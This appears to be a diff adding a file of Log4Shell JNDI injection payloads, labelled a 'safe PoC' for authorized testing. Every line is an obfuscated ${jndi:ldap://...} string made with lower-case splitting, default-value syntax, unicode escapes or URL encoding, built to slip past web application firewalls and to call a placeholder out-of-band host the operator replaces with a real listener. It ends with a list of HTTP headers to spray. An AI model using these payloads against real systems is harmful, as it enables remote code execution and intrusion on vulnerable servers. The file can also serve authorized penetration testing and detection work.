@@ -1,0 +1,22 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# JNDI lookup obfuscation battery (modern WAFs match literal ${jndi:} only).
+# Placeholders inert. Authorized testing only. (JNDI kit JNDI-006 file form.)
+# WHAT TO EDIT: YOUR-OOB-HOST.example.invalid -> your listener.
+# ============================================================================
+
+# lower-case splitting
+${${lower:j}ndi:${lower:l}dap://jndi1.YOUR-OOB-HOST.example.invalid/a}
+# default-value syntax (k8s/env style)
+${j${k8s:k5:-ND}i:w${lower:eb}logic://jndi2.YOUR-OOB-HOST.example.invalid/a}
+${${env:FOO:-j}ndi:ldap://jndi3.YOUR-OOB-HOST.example.invalid/a}
+# upper-bound splitting via ::-
+${${::-j}${::-n}${::-d}${::-i}:ldap://jndi4.YOUR-OOB-HOST.example.invalid/a}
+# nested lower on protocol
+${jndi:${lower:l}dap://jndi5.YOUR-OOB-HOST.example.invalid/a}
+# unicode escapes (json/log4j decoders)
+\u0024\u007B\u006A\u006E\u0064\u0069:ldap://jndi6.YOUR-OOB-HOST.example.invalid/a
+# URL-encoded path variants (for query placement)
+%24%7B%6A%6E%64%69%3Aldap%3A%2F%2Fjndi7.YOUR-OOB-HOST.example.invalid%2Fa%7D
+# header spray candidates: UA, X-Forwarded-For, Referer, Origin, Accept-Language,
+# X-Api-Version, Cookie, Authorization - ONE unique host per header.
